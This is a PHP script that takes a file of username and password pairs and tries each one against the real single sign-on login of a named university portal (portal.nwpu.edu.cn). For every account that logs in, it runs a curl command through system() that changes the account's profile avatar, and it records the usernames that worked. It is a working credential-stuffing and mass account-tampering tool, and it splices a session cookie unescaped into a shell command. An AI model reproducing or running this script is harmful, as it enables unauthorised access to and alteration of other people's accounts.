<?php
	require_once ('HttpClient.php');
	$book = fopen("result2012", "r");
	$endd = fopen("result2012w","w");
	while (!feof($book)) {
		$line = fgets($book);
		$line=str_replace("\n","",$line);
		$info = explode(" ",$line);
		$client=HttpClient::quickGet('http://cas.nwpu.edu.cn/cas/login');
		$itHtml=$client->getContent();
		$preg="/name=\"lt\" value=\"LT_nwpuapp[\d]+_-[\d]+-[\w]*/";
		preg_match($preg,$itHtml,$match);
		$itHtml=$match[0];
		$preg="/LT_nwpuapp[\d]+_-[\d]+-[\w]+/";
		preg_match($preg,$itHtml,$match);
		$it=$match[0];

		$client=new HttpClient('cas.nwpu.edu.cn');
		$params=array(
					'encodedService' =>'http%3a%2f%2fportal.nwpu.edu.cn%2fdcp%2findex.jsp',
					'lt' => $it,
					'password' => $info[1],
					'service' => 'http://portal.nwpu.edu.cn/dcp/index.jsp',	
					'serviceName' =>'http://portal.nwpu.edu.cn/dcp/index.jsp',
					'username' => $info[0]
			);
		$client->post('/cas/login', $params);
		$cookie=$client->getCookies();
		$result=$client->getContent();
		if( strlen($result)<1000){
			$preg="/http:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/";
			preg_match($preg,$result,$result);
			$result=$result[0];
			$client=new HttpClient('portal.nwpu.edu.cn');
			$client->setCookies($cookie,true);
			$preg="/ST_[\s\S]*/";
			preg_match($preg,$result,$result);
			$result=$result[0];
			$result="/dcp/index.jsp?ticket=".$result;
			$client->get($result);
			$result=$client->getContent();
			$cookie=$client->getCookies();
			$fuck="curl 'http://portal.nwpu.edu.cn/dcp/profile/profile.action' -H 'Origin: http://portal.nwpu.edu.cn' -H 'Accept-Encoding: gzip,deflate' -H 'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36' -H 'Content-Type: text/plain;charset=UTF-8' -H 'Accept: */*' -H 'Referer: http://portal.nwpu.edu.cn/dcp/forward.action?path=/portal/portal&p=infoHomePage' -H 'Cookie: JSESSIONID=".$cookie['JSESSIONID']."' -H 'Connection: keep-alive' -H 'render: json' -H 'clientType: json' --data-binary '{\"map\":{\"method\":\"getCoordinate\",\"params\":{\"javaClass\":\"java.util.ArrayList\",\"list\":[\"upload_files/avatar/base/1414461342189.jpg\",\"251\",\"245\",\"117\",\"117\"]}},\"javaClass\":\"java.util.HashMap\"}' --compressed";
			system($fuck);
			echo $info[0];
			fprintf($endd, "%s\n",$info[0]);
		}
	}
	fclose($book);
	fclose($endd);
?>